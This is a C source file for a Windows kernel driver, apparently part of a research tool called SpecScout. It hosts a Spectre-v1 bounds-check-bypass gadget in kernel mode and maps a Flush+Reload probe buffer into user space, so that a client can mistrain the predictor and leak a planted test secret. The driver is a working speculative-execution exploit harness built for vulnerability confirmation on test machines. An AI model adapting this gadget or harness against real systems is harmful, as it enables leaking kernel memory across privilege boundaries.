// driver.c - SpecScout kernel-mode S1 confirmer (WDM).
//
// Hosts a Spectre-v1 "a[b[i]] behind a bounds check" gadget in KERNEL context
// over kernel-resident data, and exposes the array2[] reload buffer to user mode
// through an MDL mapping so a user-mode client can mistrain the guard and recover
// the driver's kernel secret via Flush+Reload. This confirms the S1 gadget class
// SpecScout flags in ntoskrnl is exploitable at kernel privilege on this CPU.
//
// It does NOT jump to arbitrary ntoskrnl addresses: confirming a specific
// in-binary gadget in situ needs its exact call context and is out of scope. The
// client keys the hosted gadget to each finding (spec_distance) instead.
//
// Build: see build.bat. Load (admin, test-signing on, REBOOT required):
//   sc create SpecScoutKC type= kernel binPath= C:\path\specscout_kc.sys
//   sc start  SpecScoutKC
// Unload:
//   sc stop SpecScoutKC && sc delete SpecScoutKC
//
// WARNING: loads unsigned kernel code and runs speculative gadgets. Use only on a
// dedicated test machine or VM; a bug here bugchecks (BSODs) the box.

#include <ntddk.h>
#include "kc_common.h"

// Use the two cache intrinsics we need without pulling <intrin.h>, which drags in
// the user-mode CRT headers and clashes with the km CRT in a bare (non-MSBuild)
// kernel build. The compiler emits CLFLUSH / MFENCE inline for these.
void _mm_clflush(void const* p);
void _mm_mfence(void);
#pragma intrinsic(_mm_clflush, _mm_mfence)

#define SSKC_TAG   'cSkS'
#define PROBE_BYTES (SSKC_LINES * SSKC_STRIDE)

// --- kernel-resident gadget data --------------------------------------------
static UCHAR           g_array1[16];
static SIZE_T          g_array1_size = 16;
static UCHAR           g_secret[] = "SpecScout-KERNEL-SECRET!";
static volatile UCHAR  g_sink;
static volatile SIZE_T g_zero = 0;   // opaque zero: delays the transmit, adds nothing
static ULONG           g_fill = 0;   // modelled speculative distance

static PVOID           g_probe  = NULL;  // kernel VA of the reload buffer
static PMDL            g_mdl    = NULL;
static PVOID           g_userva = NULL;  // user VA mapping (valid in client process)
static PDEVICE_OBJECT  g_device = NULL;

// The S1 gadget, in kernel mode. For an out-of-bounds x the bounds check fails
// architecturally, but a mistrained predictor speculatively runs the body:
// b = array1[x] reads past array1 (into the secret), and array2[b * STRIDE] then
// pulls a secret-dependent cache line into the shared buffer.
#pragma optimize("", off)
static VOID Victim(SIZE_T x)
{
    if (x < g_array1_size) {
        UCHAR  b = g_array1[x];
        SIZE_T acc = x + 1;
        ULONG  i;
        for (i = 0; i < g_fill; i++)
            acc += (acc >> 2) | 1;   // cheap dependent op per distance unit
        g_sink = ((volatile UCHAR*)g_probe)[(SIZE_T)b * SSKC_STRIDE + (acc & g_zero)];
    }
}
#pragma optimize("", on)

// One batch of train/mispredict sequences for a single target index. The reload
// buffer's cache state is left to the client (it flushes before, probes after).
static VOID RunBatch(SIZE_T malicious_x, SIZE_T train_x, ULONG rounds)
{
    ULONG r;
    for (r = rounds; r > 0; r--) {
        volatile int z;
        SIZE_T x;
        _mm_clflush((const void*)&g_array1_size);  // miss on the bound -> wide window
        _mm_mfence();
        for (z = 0; z < 100; z++) { }              // let the flush settle
        // branchless select: x == train_x except roughly every 6th round, where it
        // becomes malicious_x -> the guard is trained "in-bounds" then surprised.
        x = ((SIZE_T)((r % 6) - 1)) & ~(SIZE_T)0xFFFF;
        x = x | (x >> 16);
        x = train_x ^ (x & (malicious_x ^ train_x));
        Victim(x);
    }
}

// --- IOCTL dispatch ----------------------------------------------------------
static NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS st, ULONG_PTR info)
{
    Irp->IoStatus.Status = st;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return st;
}

static NTSTATUS SskcCreateClose(PDEVICE_OBJECT dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(dev);
    return CompleteIrp(Irp, STATUS_SUCCESS, 0);
}

static NTSTATUS SskcCleanup(PDEVICE_OBJECT dev, PIRP Irp)
{
    UNREFERENCED_PARAMETER(dev);
    // Unmap the user view in the process context that created it (this handle's).
    if (g_userva && g_mdl) {
        __try { MmUnmapLockedPages(g_userva, g_mdl); }
        __except (EXCEPTION_EXECUTE_HANDLER) { }
        g_userva = NULL;
    }
    return CompleteIrp(Irp, STATUS_SUCCESS, 0);
}

static NTSTATUS SskcDeviceControl(PDEVICE_OBJECT dev, PIRP Irp)
{
    PIO_STACK_LOCATION s = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = s->Parameters.DeviceIoControl.IoControlCode;
    ULONG inlen = s->Parameters.DeviceIoControl.InputBufferLength;
    ULONG outlen = s->Parameters.DeviceIoControl.OutputBufferLength;
    PVOID buf = Irp->AssociatedIrp.SystemBuffer;  // METHOD_BUFFERED
    NTSTATUS st = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR info = 0;
    UNREFERENCED_PARAMETER(dev);

    switch (code) {
    case IOCTL_SSKC_INFO: {
        if (outlen < sizeof(SSKC_INFO)) { st = STATUS_BUFFER_TOO_SMALL; break; }
        SSKC_INFO* out = (SSKC_INFO*)buf;
        RtlZeroMemory(out, sizeof(*out));
        out->stride       = SSKC_STRIDE;
        out->lines        = SSKC_LINES;
        out->probe_bytes  = PROBE_BYTES;
        out->secret_len   = (unsigned int)(sizeof(g_secret) - 1);
        out->secret_delta = (long long)((PUCHAR)g_secret - (PUCHAR)g_array1);
        out->array1_size  = (unsigned long)g_array1_size;
        RtlCopyMemory(out->array1, g_array1, sizeof(g_array1));
        RtlCopyMemory(out->secret, g_secret,
                      sizeof(g_secret) - 1 < sizeof(out->secret) ? sizeof(g_secret) - 1
                                                                 : sizeof(out->secret));
        st = STATUS_SUCCESS; info = sizeof(SSKC_INFO);
        break;
    }
    case IOCTL_SSKC_MAP: {
        if (outlen < sizeof(SSKC_MAP)) { st = STATUS_BUFFER_TOO_SMALL; break; }
        if (!g_probe || !g_mdl) { st = STATUS_DEVICE_NOT_READY; break; }
        if (!g_userva) {
            __try {
                g_userva = MmMapLockedPagesSpecifyCache(g_mdl, UserMode, MmCached,
                                                        NULL, FALSE, NormalPagePriority);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                g_userva = NULL;
            }
        }
        if (!g_userva) { st = STATUS_INSUFFICIENT_RESOURCES; break; }
        ((SSKC_MAP*)buf)->user_addr = (unsigned long long)(ULONG_PTR)g_userva;
        st = STATUS_SUCCESS; info = sizeof(SSKC_MAP);
        break;
    }
    case IOCTL_SSKC_SETUP: {
        if (inlen < sizeof(SSKC_SETUP)) { st = STATUS_BUFFER_TOO_SMALL; break; }
        ULONG f = ((SSKC_SETUP*)buf)->fill;
        g_fill = f > 4096 ? 4096 : f;
        st = STATUS_SUCCESS;
        break;
    }
    case IOCTL_SSKC_RUN: {
        if (inlen < sizeof(SSKC_RUN)) { st = STATUS_BUFFER_TOO_SMALL; break; }
        if (!g_probe) { st = STATUS_DEVICE_NOT_READY; break; }
        SSKC_RUN* in = (SSKC_RUN*)buf;
        ULONG rounds = in->rounds ? (in->rounds > 4096 ? 4096 : in->rounds) : 1;
        RunBatch((SIZE_T)in->malicious_x, (SIZE_T)in->train_x, rounds);
        st = STATUS_SUCCESS;
        break;
    }
    default:
        break;
    }
    return CompleteIrp(Irp, st, info);
}

static VOID SskcUnload(PDRIVER_OBJECT drv)
{
    UNICODE_STRING dos;
    RtlInitUnicodeString(&dos, SSKC_DOS_NAME);
    IoDeleteSymbolicLink(&dos);
    if (g_userva && g_mdl) {
        __try { MmUnmapLockedPages(g_userva, g_mdl); }
        __except (EXCEPTION_EXECUTE_HANDLER) { }
        g_userva = NULL;
    }
    if (g_mdl) { IoFreeMdl(g_mdl); g_mdl = NULL; }
    if (g_probe) { ExFreePoolWithTag(g_probe, SSKC_TAG); g_probe = NULL; }
    if (g_device) { IoDeleteDevice(g_device); g_device = NULL; }
    UNREFERENCED_PARAMETER(drv);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
{
    UNICODE_STRING ntname, dosname;
    NTSTATUS st;
    ULONG i;
    UNREFERENCED_PARAMETER(reg);

    for (i = 0; i < sizeof(g_array1); i++) g_array1[i] = (UCHAR)(i + 1);

    g_probe = ExAllocatePool2(POOL_FLAG_NON_PAGED, PROBE_BYTES, SSKC_TAG);
    if (!g_probe) return STATUS_INSUFFICIENT_RESOURCES;
    RtlFillMemory(g_probe, PROBE_BYTES, 1);  // map/zero-touch every page

    g_mdl = IoAllocateMdl(g_probe, PROBE_BYTES, FALSE, FALSE, NULL);
    if (!g_mdl) { ExFreePoolWithTag(g_probe, SSKC_TAG); g_probe = NULL; return STATUS_INSUFFICIENT_RESOURCES; }
    MmBuildMdlForNonPagedPool(g_mdl);

    RtlInitUnicodeString(&ntname, SSKC_NT_NAME);
    st = IoCreateDevice(drv, 0, &ntname, FILE_DEVICE_UNKNOWN,
                        FILE_DEVICE_SECURE_OPEN, FALSE, &g_device);
    if (!NT_SUCCESS(st)) {
        IoFreeMdl(g_mdl); g_mdl = NULL;
        ExFreePoolWithTag(g_probe, SSKC_TAG); g_probe = NULL;
        return st;
    }

    RtlInitUnicodeString(&dosname, SSKC_DOS_NAME);
    st = IoCreateSymbolicLink(&dosname, &ntname);
    if (!NT_SUCCESS(st)) {
        IoDeleteDevice(g_device); g_device = NULL;
        IoFreeMdl(g_mdl); g_mdl = NULL;
        ExFreePoolWithTag(g_probe, SSKC_TAG); g_probe = NULL;
        return st;
    }

    drv->MajorFunction[IRP_MJ_CREATE]         = SskcCreateClose;
    drv->MajorFunction[IRP_MJ_CLOSE]          = SskcCreateClose;
    drv->MajorFunction[IRP_MJ_CLEANUP]        = SskcCleanup;
    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SskcDeviceControl;
    drv->DriverUnload = SskcUnload;

    g_device->Flags &= ~DO_DEVICE_INITIALIZING;
    return STATUS_SUCCESS;
}
